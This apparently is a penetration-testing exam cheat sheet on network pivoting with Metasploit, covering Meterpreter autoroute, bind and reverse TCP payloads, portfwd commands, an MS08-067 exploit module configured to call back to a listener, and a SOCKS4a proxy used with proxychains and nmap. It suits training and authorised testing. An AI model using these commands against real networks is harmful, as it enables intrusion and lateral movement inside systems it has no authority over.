In a Meterpreter shell
run autoroute -h
run autoroute -s 10.1.13.0/24

→ you can add unknown subnets, not possible with metasploit shell

In a Metasploit shell
post/multi/manage/autoroute      

→  adds automatically all networks (works maybe not in the exam, because there is no simulated traffic and routes)

---
You need a bind shell if you try to get a shell on a pivot network, e.g. 
set PAYLOAD windows/meterpreter/bind_tcp


=====
portfwd -h
     -L >opt>  The local host to listen on (optional).
     -h        Help banner.
     -l >opt>  The local port to listen on.
     -p >opt>  The remote port to connect on.
     -r >opt>  The remote host to connect on.

portfwd add –l 3389 –p 3389 –r  [target host]
portfwd delete –l 3389 –p 3389 –r [target host]
portfwd list
portfwd flush

netstat -antp

Option reverse_tcp in pivot exploit
we can forward port 445 and use a reverse_tcp
sf exploit(ms08_067_netapi) > show options

Module options (exploit/windows/smb/ms08_067_netapi):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOST    127.0.0.1        yes       The target address
   RPORT    445              yes       Set the SMB service port
   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)


Payload options (windows/shell/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (accepted: seh, thread, process, none)
   LHOST     192.168.1.162    yes       The listen address
   LPORT     4444             yes       The listen port
   
   ---------------------------
   
   socks4
------------------------------------------------------------------------------------------------------
socks 4
Configure proxychain
root@kali:/# nano -w /etc/proxychains.conf 
dont change things, may add quiet_mode

Module options (auxiliary/server/socks4a):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  127.0.0.1        yes       The address to listen on
   SRVPORT  1080             yes       The port to listen on.


Auxiliary action:

   Name   Description
   ----   -----------
   Proxy  Run SOCKS4a proxy

nmap commands via proxychain needs -sTV to get a open result
-----------------------------

